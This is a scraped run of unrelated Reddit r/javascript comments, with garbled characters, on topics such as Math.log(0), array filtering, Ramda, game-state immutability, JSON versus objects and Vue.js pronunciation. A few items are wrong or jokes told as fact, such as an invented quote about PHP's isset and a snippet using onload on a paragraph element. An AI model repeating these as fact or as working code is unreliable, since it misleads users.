In mathematics, `log(0)` is indeed undefined. In JS, however, [the specification says](http://www.ecma-international.org/ecma-262/5.1/#sec-15.8.2.10) that it's negative infinity. Why that is, is something only ~~Ecma~~ IEEE can answer, but I'd suspect it has something to do with [log n â†’ -âˆž when n â†’ 0^+](https://proofwiki.org/wiki/Logarithm_Tends_to_Negative_Infinity). In other words, although log(x) isn't defined when x=0, it'll get closer and closer to -âˆž as x gets lower. It's still boggles my mind why they didn't just decide to set its value to `NaN` like they do with negative numbers, though. [Edit] See below
Thanks
Operators are hacks? 
True, use Math.log10() instead
[GIFV link](https://i.imgur.com/ZkyDhCi.gifv) // [FAQ](https://www.reddit.com/r/livven/wiki/gifv-bot)
Or there's the ES7 `**` operator
If the goal is to round something to an even multiple of another number, you can use a helper function like: function roundTo(val, multiple) { return Math.floor(val / multiple) * multiple; } Then to round the current timestamp to midnight: var timestamp = roundTo(Date.now(), 86400000); (You could use `60 * 60 * 24 * 1000` instead of that constant, or give it a symbolic name. I tend to not do that as 86400 is just one of those numbers that you instantly recognize whenever you work with dates and times enough.) This is subtly different than your version, as it rounds to midnight UTC, not midnight in the current locale, but for bucketing that probably does not matter. 
It's very fast and displays nice on my phone. Very nice
I built an app on top of JIRA API for ScrumMasters, PO, managers that want to have a fast and easy view of closed sprints. http://releasenotes.position-absolute.com/ Built with react &amp; redux.
What if you're writing a library?
1) #5 is probably not very useful and pollutes the namespace (benchmarks? I'd be surprised if this actually sped anything up at all). In most cases, you should be using `forEach` anyways. 2) #4 is a bad idea if the argument could be falsey. 4) Don't do #6. Use `hasOwnProperty`. If you don't actually want to check that, just use `document.querySelector` (in the example) or `document.querySelector != null` if the property could possibly be falsey (not true in this case) 5) Mistake in #10; it doesn't create a new array. The article shows it, but it says it wrong ("which instead creates a new array")
This is gold! Hopefully you've posted it over at /r/tinder I'm sure that they will absolutely love this!
Glad you like it. I've posted there before; wanted to get some feedback before I send it back to them.
I do love `Maybe`. The declaration of the `Maybe.none` creator should be this, though, right? Maybe.none = () =&gt; ({ isSome: false })
Whoops, you're right. Edited.
all of these is quite easily done with Ember, and you get a lot more for free right out of the box compared to Angular or React. Definitely do not use Backbone at this point. 
Chrome supports ** already 
`console.log(2 ** 4)` &gt; `Unexpected token *`
I made this little visualization to space out on with d3js. http://alabasgames.com/svg/stars2.html
View source....
Fucking gold worthy! ðŸ˜‚
Pagination causes search filter to be discarded immediately? Also doesn't support multi-dimensional sorting and the demo doesn't show if it supports natural sorting or not. Not sure why this has so many upboats.
One big advantage of the immutable state is, that you can check Very easily if state has changed. For example an array of enemy positions. If the array is still the same, you know that no enemy has changed. BUT! since game development often relies on canvas, you have to redraw everything every frame nonetheless (if you don't implement some sort of caching), so you don't need to check if an array has changed, because you are rendering every enemy at every frame. 
[removed]
You can mostly get by with just `map`, `reduce`, `filter`, and `pluck` with `pipe` to string functions together. const incrementedOdds = R.pipe( R.filter(x =&gt; x % 2 !== 0), R.inc ); console.log(incrementedOdds(R.range(0,20))) As you use it more, you'll find use for most of the functions. The names for most of the functions are usually pretty similar across functional languages and libraries. If you know underscore or lodash, Ramda is pretty much the same thing but the array comes last. I had the advantage of having worked with a bunch of other functional languages so I always found it fairly straightforward. I find it easier to build up reusable functions in Ramda than in lodash/underscore, so I prefer it but if you don't then any sequence lib tends to get the job done.
list.js is quite nice: http://www.listjs.com
You have to use IDs unless it's an image.
Thanks! Out of curiosity, what would you do for an image?
Try FancyGrid - JavaScript Grid Library on JQuery with number of features. http://fancygrid.com
Finally published my native dom property and attribute listener library. Allows for listening to changes from things like 'innerHTML' or any other Node prototypes. https://github.com/keleko34/KB
Does that "obj = obj || {}" part check if the argument is present and if not, create a new blank object?
That's called the Vanilla pattern, what don't you understand? /s
Personally i wouldn't use ID's. Using ID's means you are cluttering up your HTML with stuff you need for .js.. Use document.querySelector and document.querySelectorAll to get a reference to your HTML elements from .js, then use the event model to hook up a handler for the event on the HTML element. Use this for everything! (Edit: I'm on a phone or i would have scripted an example, maybe later when i get behond a computer)
I have done it before as well with Express
Yeah, I found Ramda tricky to get started with, but then I found lodash and underscore unapproachable when I first looked at them too. Not having done that much functional programming in the recent past, none of the function names were familiar to me either, so I kept having to read the descriptions for each function to find what I wanted! This isn't made any easier by the fact that the initial description is often overly abstract, but I've learned to quickly skip to the example code snippets for concrete examples of what each function does. Once you get a foothold you'll be fine, as you'll only very occasionally find the need to add a new function to your arsenal, and you'll be more adept at knowing how to find it. And, as @grayrest points out, you really really don't need very many functions most of the time.
You can store your numbers in an array and then simply pick a random index like this: var numbers = [10, 20, 30, 40, 50]; var random = numbers[Math.floor(Math.random() * numbers.length)];
I just figured it out as well haha :D I completly forgot about arrays. Thank you :)
You can do double canvas buffering to draw only the parts which have changed on the top canvas and keep the background etc. On the back canvas
Yes i'm. I've tryed something similar of what you posted but the element doesn't change, it doesn't get the value while with innerhtml it changes.
Array.filter is your friend Basically you can do var filterConditionType = "tree"; var filterConditionColors = ["yellow"," brown"]; var arr = *your object* var filteredArray = arr.filter(el=&gt;el.type==filterConditionType&amp;&amp;el.colors.some(e=&gt;filterConditionColors.some(ele=&gt;ele==e))); I think that should work, can't test because I'm on mobile, more on Array.filter https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/filter
https://jsfiddle.net/w0k0atmg/
Could you fetch the element from the onload event data? It is probably referenced as event.target or similar &lt;script type="text/javascript"&gt; function turnBlue(event) { event.target.style.color = "blue"; } &lt;/script&gt; &lt;p onload="turnBlue"&gt;azure&lt;/p&gt;
oh haha! thank you so much â™¥
Youre on the right path. Im attempting the same idea. "Mutable redux". As long as you manage you're mutations in a strict manner so that you could "replay" them you"ll have the same features redux provides. I found the GC performance hit from allocating new immutable references when using the usual redux pattern to bee too much when game deving.
But when using floor, shouldnt you use Math.floor(Math.random * nums.length) + 1?
Sidenote, these comments are absolutely useless, try using them only when the meaning of code isn't instantly clear.
I know, but formatting code on mobile is pain in the ass, sometimes reddit just ignores all the spaces and clumbs it all together (even ignoring the 4 to make it render as "code" like that), I've had it happen to me more than once...
You could just do `new Date()`, then set hour, minute, second to 0 if you're trying to get midnight in your local timezone.
 /** * @param {Array.&lt;Object&gt;} objs The array of objects to filter. * @param {Array.&lt;string&gt;} types An array of allowed types. * @param {Array.&lt;string&gt;} optColors An optional array of allowed colors. */ function filterObjs(objs, types, optColors) { return objs.filter(function(obj) { if (types.indexOf(obj.type) == -1) { return false; } if (!optColors) { return true; } return optColors.reduce(function(retVal, color) { if (obj.color.indexOf(color) == -1) { return false; } return retVal; }, true); }); }
Oh, yea indeed. For a site with such a large technical userbase the code snippet support on reddit sucks, even on desktop it is annoying. We should have a fancier widget UIX and some highlighting and proper mobile support.
`Array.filter` returns a new array, though. I'd rather change a `visible: true/false` boolean in each of the objects, so I can order them with a CSS `flexbox` setup :) That said, I could technically work with 2 arrays: one with the active objects, and one with the inactive objects, and join them later... but that feels like hell to maintain.
Did you say Markdown?
Yea but without indenting support in the widget it is a pain to write code.
Just use the top comment then, use array.map, and instead of returning a conditional, set visibility if that conditional passes. 
No because arrays in javascript are 0 indexed. Therefore you want the range of 0 through (length of array -1) hence why you don't need the + 1. A helpful way to think about this is to break the formula into it's parts: Math.random can be minimum 0, maximum 0.99; If you have a 5 item array therefore you will at minimum have 0 and maximum ~ 4.95. After applying the Math.floor this leaves you with the range of 0 - 4 which fits perfectly for indexing a 5 item array in javascript.
Thanks, I'll offset it to a helper function then. Legibly was more an issue than performance, so I suppose clarity wins over funny bitwise business.
In most games, game objects aren't being created every frame. You do want to avoid allocating things like vectors or other temporary objects that might be used a lot in render/logic updates. But in my experience using the GC to manage game objects is fine - except things like particles. EDIT - just to be clear, I'm not advocating rebuilding all object states every frame, that would be terrible. I'm advocating mutating existing objects. But using the GC to manage creating/destroying objects periodically as they appear/dissapear from the game should be ok unless they're extremely heavy.
I usually make games with just vanillaJS. But I guess not everyone prefers that approach :D
It's really not needed unless you have some insane physics/AI requirements.
.map returns an array. .foreach doesn't so it's a bit more clear in intent if you don't want a new array returned.
You shouldn't worry about things like that at all until it becomes an issue. Any game, 2D or 3D, where the camera moves you're going to be re-drawing the entire screen. WebGL is so fast that even on moble, you could render dozens of overlapping fullscreen layers without a hitch. In a general sense, if you can cache the results of some complex operation, then sure, go ahead. But for just about any game a solo/newbie developer is going to make, this should not be much of a consideration. Making sure your rendering is done on the GPU and batching draw calls effectively (the things a library like pixi can help you not worry too much about) should be the main concern.
Here is the jQuery datatables one: https://www.datatables.net/
Mutating your model objects strikes me as a "code smell" (I.e. Hack) but I don't know everything about your overall architecture. Stateless, functional style programming has a lot going for it.
"You shouldn't worry about things like that at all until it becomes an issue". 100% agree with that!
I assumed he didn't just add them for this thread. Maybe I'm wrong. Also, `isset`, that's an easy one. When PHP first got created, Rasmus Lerfdorf used snake_case for all functions, since that's what people have been doing in C since forever. But after he had written the first half of the standard library, he realized it was so much work to type all the function names, so he decided to leave the underscores out from now on, because, quote "nobody is going to use this crap anyway, lol". So to get to a function name that actually makes sense, you just have to try and insert underscores after each character. "`i_sset`, hmm, no. `is_set`, ah, yeah, that's the one.
Comments should focus on why, not how. Good code says how. 
JSON does not support self references. You'll need to write the final value or use a script to generate the JSON from some other structure.
React doesn't require immutability either. Immutability just makes it cheaper to compare the previous state with the current state to determine if it needs to rerender. 
No, JSON is essentially represented as a string. Nodes `JSON.stringify` will attempt to convert `100 + this.armour` to a primitive value (in this case `NaN`), but other implementations of `stringify`would perhaps render it as a single string that when parsed would result in a string `"100 + this.armour"`. If I were you, I would store the stringified object only with values that can be represented as primitive values. Then, when you parse the JSON string into a JS object, pass it into a function that will compute the additional properties that rely on other properties.
https://github.com/wenzhixin/bootstrap-table Bootstrap table
Okay, can I bounce an idea off you? So, I was thinking of doing something like courage : function(){ this.courage = 100 + this.armour; } but then I'd have to call that to apply it... do you get where I'm getting at?
okay, so, how would I do something like this with *actual* javascript?
Loving this one! Did not know about `Array.some` to be honest! Thanks!
What you're talking about is actually idioms inspired by game development. It's JavaScript that's catching up. Games have so much state, so much complex state - hundreds of thousands of times more complex than a web app - that you can't just handle it willy nilly. For example online games - you know what the server sends back to the players? A blob of state (or more accurately the changes but you can think of it as the same thing). They recreate the state of the game very single tick (not the same as every frame). Well, good online games do this anyway (I still get nightmares of Settlers 4 Game out of Sync errors). For example in Overwatch you get a play of the game highlight at the end of the round. How do they do this? They save the state of every single tick, then they can play/rewind it as they please later. StarCraft2 does this as well kind of - instead they only store the given inputs (since the game is deterministic) - this is why an hour long replay of the game is about 20kb (only stores the given inputs of each player on each tick basically). Redux perhaps isn't suitable but you should definitely develop in such a way that your render function only takes a single 'state' object and can render the complete state of the game at that given time without knowing anything else - i.e., a pure render function.
&gt; using the GC to manage game objects is fine Yeah absolutely, I guess I worded that a bit too strongly :) What can I say, it bit me in the ass because initially I used temporary objects as if they were "free" (that is, I only saw runtime cost, not the less directly correlated GC cost), all over the place. It added up, so badly, like having hundreds of dripping taps, and to see how smooth even my own derpy code (I'm not being humble, it's derpy :D) ran once I had fixed all those leaks was quite stunning. It's the one thing I had to find out the hard way because it's hardly mentioned anywhere, not outside gamedev. It's kind of a blind spot by default, and I think it shouldn't be. Don't get me wrong, GC is a wonderful thing, I certainly don't want to have to allocate and free memory manually, but it's still useful to know about it and how to avoid/control it, and how to determine whether that is even useful or necessary. Surely for games and maybe even for general web development.
Np, there's also the Array.every which you can use to check that each element matches the given condition.
Programming languages have quirks, news at 11
I agree with what the others here have said about limited mutability (mutate state in limited places at controlled times). I thought I'd point out that Immutable.js can provide immutable data structures with less garbage than copying plain JS objects. It does still create garbage, of course, but it could be a small enough amount of it depending on the specifics of your game. Regardless, immutability is likely not as important as just understanding where mutations happen. 
You should try [MobX](https://github.com/mobxjs/mobx). It can give you observable mutable objects which are pretty fast. I am curious-are you using react for your game? Do you also use https://github.com/Izzimach/react-three ?
Aaah, this is really good! Thank you. So, in my example, the ES6 'class' type is basically just putting a fancy skin on the example you've just given, and thus this way is more efficient (albeit marginally)?
In your example, `foo` is in scope and should be defined. However, when dealing with any global state, it's hard to say for certain that something didn't touch it and make it `undefined` after that initialization but before the promise was resolved. 
First of all, you shouldn't take contracts for jobs you don't know how to do. That's not fair to your customers or other people in your industry. And no, you can't restrict access to a website with only client-side JavaScript. Anyone would be able to turn off JavaScript and bypass your system. You need a server.
store it in a variable. var something = someFunctionCall(); someOtherFunctionCall(something);
&gt; else if (true) Da fuq?
&gt;The qualities that make it flexible (e.g, object prototypes and loose typing) are the same qualities that work against good engineering. For all of ECMA TC39â€™s efforts, this has not changed. Had trouble reading past this. It's clear the author assumes that object prototypes are uniquely a fault of javascript, without understanding that this is a common design pattern in even classful languages. It's called the *flyweight pattern*. Hell, if you want to get really technical, delegating prototypes is basically how virtual method calls work in a classful language like C# or java. At run time in these languages, objects have a "pointer" to their type, which itself has a pointer to its base type. This pointer chain goes all the way back to `object`. When a virtual method call is made, the pointer chain is walked until a suitable method can accept it. Sound familiar? e: fixed a typo
First off a account system isn't what needed i just wanted to make it more easier for them to add content and such. Second that's they asked me not i was offering it to them. i don't lie to them and say that i'm not the best, but they mostly just want some static websites. But i uses this oppurtinity to improve myself so i thought i could use Javascript maybe to create something like that
Pretty much the same, yes - you can see this: https://www.reddit.com/r/javascript/comments/49r321/es6_is_beautiful/d0v3bhe?context=3 If it's more "efficient" or not is moot - they're both just as "performant", if you will.
&gt; because i don't have any expierience with a CMS i thought i would make my own little CMS Let me know how that worked out for you.
Yea, thatsÂ´s exactly what I did :)
Might be a cross browser issue - according to the [caniuse page](http://caniuse.com/#search=localstorage) the events were pretty broken for IE 10/11. Personally, if the thing in question isn't critical to the site I'd probably just use the events.
I'm meaning this as respectfully as possible, but you are in so far over your head you don't even realize you can't see the sun anymore. Use Wordpress. Or something else. Just don't go the custom route, you're lacking the basic fundamentals to make that route work. I don't mean this condescendingly. Everyone starts out where you are, and your enthusiasm is good. Just realize that while certain words of what you have been saying are true, the sentences themselves don't make sense. 
Vue.js (pronounced /vjuË/, like view) https://vuejs.org/guide/overview.html
Thanks!
1.) I would suggest you to use [Magnific Popup](http://dimsemenov.com/plugins/magnific-popup/) instead of Fancybox (I think it's much more developer and user friendly). 2.) What you are experiencing is actually not a bug, it's an expected behavior. Fancybox doesn't care whether your images/thumbnails/links are visible or not, the only thing it cares about is the `data-fancybox-group` parameter. I see you have already figured that out and you are attempting to change the parameter on filtering, but you are making a mistake when doing this: `$(selector).find(".fancybox").attr("data-fancybox-group", selector);` So what you are doing is looking for elements with `fancybox` class inside of the elements that match your selector, but what you should be doing is looking for elements that match your selector AND have a `fancybox` class. So the correct code would be this: `$(selector + ".fancybox").attr("data-fancybox-group", selector);` Try it and I think it should work.
Fantastic - thank you! You, captain, have earned a treat - check your inbox...
&gt; No other notable language created in the past quarter century has adopted object prototypes, except for 23-year-old Lua. ... Languages like Smalltalk and C++ are capable of writing programs as big as a million lines of code. JavaScript would be hopeless in these situations. They don't use the word "prototype", but Smalltalk's, Python's and Ruby's implementations are strikingly similar to JavaScript's. In those languages, classes are actually objects (for example, you can monkey patch them), and inheritance happens at runtime by delegation. &gt; However, the latest ES6 class feature is only a half-assed implementation of class-based OOP. Itâ€™s just syntactic sugar over object prototypes. It still doesnâ€™t support private state (member variables) in the way we expect. Member variables must be â€œfakedâ€ through a variety of workarounds such as programming convention, capturing normal variables with closures, and employing WeakMaps. ES6 is not a proper class-based OOP language like Smalltalk, C++, C# and Python. Python doesn't support private members either, just FYI. It too relies on programming convention.
Speaking as a developer, I wouldn't market your project to potential developers as either easy or a timeframe of how long development will take. Let the developer decide the difficulty and time to completion. Good luck on your project though!
I pronounce it like you would in a phonetic language "voo-weh" because I like to be silly.
Front-end is a subsystem.
What kind of physics? Simple motion or complex shapes with proper collision response requiring integration etc.? If it's the latter then maybe you might need something like ammo.js. Otherwise you can update 100s if not 1000s of objects in plain JS. The OP didn't suggest needing complex physics.
so "!number1" means something like "not falsey" ? 
~~Yeah, exactly.~~ *I was not thinking clearly. It means "not truthy". See my correction to the original comment.*
/u/gustix already gave the proper pronunciation for Vue.js. Note though that the 'ue' in French is not pronounced 'oo', but like the German Ã¼.
Maybe because 0/0 is indefinite. But this function doesn't seems to give the average between the 2 numbers..
lost it at if (typeof jQuery == "function") { jQuery.ajaxSetup({ "async": false }); } 
Getters are properties -- you could access it like `card.courage` The real benefit will be if you change armour at some point - courage, if it's defined in the constructor only, won't change -- if you have a getter you can always calculate 100 + almour
It does appear the gist of the author's argument is that without private state, you can't reasonably have large applications. I figure their head might explode if they knew there's thousands upon thousands of lines of code written in functional languages, where private state is either illegal or highly discouraged.
In many cases of game development mutating state is a necessary thing for development. You have to choose between mutating or creating, and creating means GC. There are exceptions, for instance of your making a multiplayer strategy game, in which case you have a shared game state that needs to be synced over the Internet. If so, look up lockstep strategies (it's similar to redux)
There you should use â€™ (`&amp;rsquo;`) anyway.
In that case just use forEach: objArr.forEach(function(obj) { if(obj.type === 'tree') obj.visible = true; else obj.visible = false; } Or, if you're using a templating engine, set the type as a class and use jQuery to .hide/.show methods to reveal the appropriate DOM elements.
Seems interesting, but an HOUR long? TL;DW please 
I used to work at Peet's coffee in Mountain View, and I would get the occasional regular American customer who would pronounce croissant correctly--it just sounded so pretentious (and I'm of French descent).
Vue isn't pronounced `voo` in French, the French sound for `u` doesn't exist in English. "Vous" sounds like 'voo' https://translate.google.com/#fr/it/vue%2C%20vous (click the speaker icon at the bottom of the text box)
It's mostly a typescript 101 (which is why it's so long), aimed very particularly at .NET developers (this was at the BUILD conference). He demos it with react and ng2, showing off a few features like writing interfaces against JSON responses to give you static typing there. There's also a little bit of systemjs. A little bit later, he shows writing a simple node server and using visual studio code to debug it. Then, he shows off salsa, which is another visual studio code thing. It's javascript powered by typescript, so you get some inference and intellisense with plain javascript files that has jsdoc on it, and importing typescript definition files to use in normal javascript. Finally, he talks about the future of typescript, and what features it'll eventually support. This is probably the thing of most value to people in this subreddit, starts around 43 minutes in.
The `map` function will create a new array, if it is acceptable to alter the array passed as a parameter, `forEach` might be a better choice.
Well, it needs people, good people on their books, for it to work first. So if you like the sound of it, sign up and help them grow. I would, but I get the impression they are for permanent placements. If they cater for contract, I'd sign up. Yunojuno works in a similar way, but its more London centric. 
No, it's the same old recruiter thing spun a different way. The company is *still* going to interview multiple programmers, and they're still going to pick the one they like in the end. There's no way that companies are going to put their hiring completely in the hands of a recruiter, no matter how talented they claim to be. And the claim of getting you a job in 2 weeks? There's no way they can actually guarantee that. Worse, they apparently remove your posting after those 2 weeks, so if you don't find a good job in that time, you have to start over with them.
Why not just modify the setItem command to also manage the keys? This way you wouldn't need the setInterval. Unless other code will be working with localStorage outside your interface?
You may be pointing out my ignorance here, but does that mean that : var myObject = { name : "oh shit" } is not a JSON object, whereas... var myObject = { "name" : "oh shit" } ...is?
Tangentially related: In German, if you can't use the Ã¼ for spelling, for example when inputs have to be alphanumeric, you fall back to ue as well, not u. Same goes for Ã¤ (ae) and Ã¶ (oe) .. I have to do this a lot when renaming files I receive from clients and I remove special characters and spaces from the filenames because it bugs me to link to those things after uploading. Took me a while to get used to the name Uber when I learned about it.
As [more internet traffic arrives via mobile than desktop browser](http://media.ofcom.org.uk/news/2015/cmr-uk-2015/) (at least here in the UK), I tend to assume that it's browser-specific functionality until it's rolled out across everything; while I love progressive enhancement, I'm going to stick to the upcoming standard if I'm prototyping unless it looks like I'm going to be launching before these features are standardised...
I'll be changing it a whole bunch, actually, it's just that when I was avoiding the use of classes, I was also avoiding the use of subclasses - thus calculating amour variances was a bit more complicated. sit tight - will probably end up posting a link to the finished product once it's tested and out of BETA...
Okay, so seeing as how JSON stands for JavaScript Object Notation, could you clarify for me what is the difference between JSONotation and a JavaScript Object? -P
Doesn't work. $ js-code-stats zsh: /home/adam/.nvm/versions/node/v5.9.1/bin/js-code-stats: bad interpreter: /usr/local/bin/node: no such file or directory Change it to `#!/usr/bin/env node`
Sure, but the author didn't state he didn't either. He implied that performance was a concern. In those cases, one should always consider the low level approach. Didn't say he needed it, I suggested he try it. This is exactly the reason emscripten was made: performance.
Aaah, okay, I think I get you. So it seems that up to now I have used the terms for a Javascript Object and JSON interchangeably. One last clarification : Does that mean, then, that JSON is only really used when you're pulling things in from another context; and thus is just one of many data structures? For example, if I was grabbing data from MongoDB and pulling it into my controller, I'm more likely to create a Javascript Object from that data than I am to create a JSON object, as the JSON object would need further translation? I get that, at this point, we're talking semantics - but using the correct language is probably important if you hope you be understood, eh? -P
This is really useful, because I'm doing this largely in the context of the MEAN stack. So, would you mind clarifying something for me? I have the data behind these 'cards' stored in my MongoDB, when they're needed they'll be retrieved, translated into JS Objects (from JSON objects? are things stored in MongoDB as JSON objects or just Strings? Same things? Sorry if I'm being slow - I'm writing this after MANY bottles of wine), and then applied to the HTML via an Angular controller. Would you say this is the correct workflow, or am I overcomplicating things due to my somewhat hazy understanding? -P
Yea that sounds right. Interesting you should mention mongodb because it has it's own subset of types -- that `Date`example -- mongodb uses `ISODate` to represent it's dates. When you pull data out of mongodb the driver will typically handle this conversion for you and the object you'll receive in your controller will be a Date. One of the major pain points I've had with mongodb relates to using the REST apis... the way in which mongodb does this is ... kind of weird : {_id: ObjectId('572fc5d3395a5302a98c4211'), date: ISODate('2016-05-08T23:03:47.027Z')} converted to json looks like this : {"_id":{"$oid":"572fc5d3395a5302a98c4211"},"date":{"$date":"2016-05-08T23:03:47.027Z"}} When interacting with the REST api of mongodb, you need to use this transport mechanism to ensure the types are retained.
Someone in a different company than me says "Voo" so that no one gets confused if someone needs to talk about a view.
They try in Britain. It comes out sounding like "kwass-sahn"
Mongo accepts JSON on its frontend and then converts it to something called BSON for storage on its backend. JSON is just an intermediate step, although BSON looks pretty similarish to JSON in some ways. https://en.wikipedia.org/wiki/BSON Pretty much every language has a JSON utility, so JSON is a reasonable middle step for any language that wants to write to a Mongo database.
Why would this be any better? something is now global vs. someFunctionCall. How is this ultimately different other than not being hoisted(is that right)? Thanks
Nobody's even mentioned, that the thing is a **view** library, guys.. I mean, no kidding it's pronounced that way..
It's definitely a typescript initiative, but one I've only seen in VSCode so far. &gt; Its why you now can have both typescript and javascript on the same project You could always do this, just you'd have to bundle them outside of `tsc`. Almost all typescript projects rely on (some) pure javascript dependencies. &gt;the typescript compiler was changed to work with javascript as well. Kind of. It does basic syntax checking and will emit with typescript, but it's not like it'll read types and do type checking from jsdoc or anything (afaik). This is what is different about salsa, which does exactly that. e: [Apparently it's part of preview builds to visual studio now](https://github.com/Microsoft/TypeScript/wiki/Salsa). Neato.
Why is it pretentious? I've never known any other way to pronounce it.
Cruh-saunt.
Oh probably yea. 
Before the javascript wasn't dealt by the compiler, it only cared about the associated definition file that represents it. Now it will pick up some things without it. It isn't very complete yet I agree, but better than nothing.
Yep, eslint does all of this and more.
I never considered the e notation. I even screwed up tonight counting zeros. I need to compensate for the time zone so the bucket rolls over at my midnight, so client side charts come out right. The timezone offset will switch between -4 and -5.
Just as a matter of curiosity, what is the largest JavaScript program ever written in terms of lines of code? Anything on the scale of 100k to 1m lines? (The largest Python program to my knowledge is around 250k lines. The largest Smalltalk program is 1m lines: the JWARS battle simulation program commissioned by the U.S. joint military.)
So, by using the not operator on an expression (`!expression`), you're coercing that expression to a boolean. In Javascript, any value/expression can be interpreted as true-like or false-like. This is often referred to as "truthiness", and the coerced value referred to as being truthy or falsey. It essentially works by testing to see if the value is one of a limited set of falsey values. Anything not falsey is truthy. There are (to my knowledge) 6 falsey values: * False (boolean) * "" (Empty String) * null * undefined * 0 (the number value) * NaN (not a number) Any value that isn't one of these 6 is said to be "truthy". ---- As an aside, this is also why you often see statements like `!!expression`, which is used to explicitly convert a value into its boolean equivalent (Falsey values become `false`, truthy values become `true`)
This is really cool, but that's about it for me. I'm sure some Java guys will really like this as they can finally reenter front end with (almost) just Java again.
I should have been a bit more specific. My question is more about any possible unintended consequences of passing a shitload of new Dates() as parameters. I assume they will all get cleaned up when the constructor finishes, but I've been busted by my assumptions before. Thank you for the comments regarding the time functions, helped me think about the problem and solution differently.
Story of my life. Wtf was I thinking, oh yeah...that's why I should write comments.
Oh god why
If your argument is that strong typing and enforced encapsulation are good things, then I agree. It's better to catch mistakes at compile time than at runtime. But you undermined your argument in two very big ways: 1. JavaScript should be more like Python. Even though Python (and probably yet more languages than you realize) has the same characteristics that you were criticizing in JavaScript. 2. JavaScript (and by implication that you didn't realize, Python too) would fall flat. You hugely, grossly exaggerated the downsides (whatever they may be) of loose typing and private-by-convention.
Considering what it's doing, that isn't surprising at all. Emulating a JVM in a very high level language to run a compiler for a lower level language to effectively create an interpreter for a compiled language...
JVM written in Javascript? But why?
All I see when I click the link is the standard "Firefox prevented this tab from opening 'n' popups" message with 'n' increasing quickly. Pressing the back button or closing the tab works as normal. 
Undoubtedly there are better languages than JavaScript for managing complexity. Like C, it requires more disciplined engineers if you want to write it at scale, however that's not the fault of prototypes. It has a lot more to do with the weak typing, mutable data structures and the strange layer of syntactic familiarity of `this` and `new` that give programmers headaches in JS. We can do better than JavaScript in terms of programming language design and there's no one who will debate that, but that's not the point you tried to make in your post. I still don't see anything that resembles a comprehensive argument for why using prototypes can be considered as a "deliberate handicap".
I don't see a difference here in var something = someFunctionCall() and just using someFunctionCall. Just do this: someOtherFunctionCall(someFunctionCall()); 
There is code out of my control that uses it, but could you explain further?
Will do this evening. Thanks!
If it would be "voo" than it would be written like "vaux".
It really depends on what type of app are you building. From my experience React Native works well if your app uses certain types of native components (https://facebook.github.io/react-native/docs/native-components-ios.html#content). Also, it depends whether you are savvy programmer with Java and Swift. 
thanks ill try to make it better
To run ooooold java stuff in the browser , which still a lot of firm have hanging around? Could be cheaper the buy a 4K PC than to recreate or make a new version.
its very nice to know what are my mistakes to correct them and make my codes cleaner and better, and thanks for your helpful comment
yes and nothing is perfect, i'll make it better soon, and honestly, i've wanted some inspirational comments, saying that go forward and get it, thanks for your Comment
As I posted in another comment: Probably for similar reasons as Emscripten existing: 1. To prove that it's possible 2. Maybe it'll *actually* be useful for something? 
For what it's worth, people can already build web apps via Java using Google Web Toolkit. Google use it for a lot of their apps. GWT has its own API that you need to use, though.
"vaux" would be pronounced "vo". The pronunciation "oo" is written "ou" most of the times, like in "vous".
correct me if I'm wrong, but it looks like the second assertion is accessing the isPrime as if it was an object, while its a function. To check if the momoization works just replace the first method Function.prototype.memoized = function(key) { this._values = this._values || {}; if (this._values[key] !== undefined) { console.log('the result of this computation was already saved'); return this._values[key]; } else { return this._values[key] = this.apply(this, arguments); }; }; besides, theres an interesting article about optimization of memoization here: https://addyosmani.com/blog/faster-javascript-memoization/
I realize your question is now answered, but I wanted to show you how this problem would be solved in a more functional programming way. The general idea is to avoid side effects because they can cause spaghetti code. [Here is a great article](http://web24studios.com/2015/10/understanding-programmatic-side-effects/) on side effects. There is a lot of crazy functions going on so if you have any questions feel free to ask: var filterConditionType = "tree"; var filterConditionColors = ["yellow"," brown"]; // A function which returns a function to be used for filtering. var includeType = (includedType) =&gt; ({type}) =&gt; type === includedType; // Another function which returns a function to also be used for filtering. var includeColors = (includedColors) =&gt; ({colors}) =&gt; colors.some(color =&gt; includedColors.includes(color)); // This function takes any number of functions, and returns a function. // It returns a function that will "AND" together their return values of all the original functions var and = (...funcs) =&gt; (...innerArgs) =&gt; funcs.every(func =&gt; func(...innerArgs)); // Create a filter which includes the type `filterConditionType` var treeFilter = includeType(filterConditionType); // Create a filter which includes the colors in `filterConditionColors` var colorsFilter = includeColors(filterConditionColors); // The array of test data var arr = [ { id: 1, type: 'tree', colors: ['green', 'brown'] }, { id: 2, type: 'animal', colors: ['yellow', 'green'] }, { id: 3, type: 'tree', colors: ['yellow', 'brown'] } ]; // Now do that actual filtering of the array. var filteredArray = arr.filter(and(treeFilter, colorsFilter)); // And print it console.log(filteredArray); [Here is a REPL that runs the code](https://babeljs.io/repl/#?evaluate=true&amp;lineWrap=false&amp;presets=es2015%2Creact%2Cstage-0&amp;experimental=true&amp;loose=false&amp;spec=false&amp;code=var%20filterConditionType%20%3D%20%22tree%22%3B%0D%0Avar%20filterConditionColors%20%3D%20%5B%22yellow%22%2C%22%20brown%22%5D%3B%0D%0A%0D%0A%2F%2F%20A%20function%20which%20returns%20a%20function%20to%20be%20used%20for%20filtering.%0D%0Avar%20includeType%20%3D%20(includedType%29%20%3D%3E%0D%0A%20%20(%7Btype%7D%29%20%3D%3E%20type%20%3D%3D%3D%20includedType%3B%0D%0A%2F%2F%20Another%20function%20which%20returns%20a%20function%20to%20also%20be%20used%20for%20filtering.%0D%0Avar%20includeColors%20%3D%20(includedColors%29%20%3D%3E%0D%0A%20%20(%7Bcolors%7D%29%20%3D%3E%20colors.some(color%20%3D%3E%20includedColors.includes(color%29%29%3B%0D%0A%0D%0A%2F%2F%20This%20function%20takes%20any%20number%20of%20functions%2C%20and%20returns%20a%20function.%0D%0A%2F%2F%20It%20returns%20a%20function%20that%20will%20%22AND%22%20together%20their%20return%20values%20of%20all%20the%20original%20functions%0D%0Avar%20and%20%3D%20(...funcs%29%20%3D%3E%20(...innerArgs%29%20%3D%3E%20funcs.every(func%20%3D%3E%20func(...innerArgs%29%29%3B%0D%0A%0D%0A%2F%2F%20Create%20a%20filter%20which%20includes%20the%20type%20%60filterConditionType%60%0D%0Avar%20treeFilter%20%3D%20includeType(filterConditionType%29%3B%0D%0A%2F%2F%20Create%20a%20filter%20which%20includes%20the%20colors%20in%20%60filterConditionColors%60%0D%0Avar%20colorsFilter%20%3D%20includeColors(filterConditionColors%29%3B%0D%0A%2F%2F%20The%20array%20of%20test%20data%0D%0Avar%20arr%20%3D%20%5B%0D%0A%20%20%20%20%7B%20id%3A%201%2C%20type%3A%20%22tree%22%2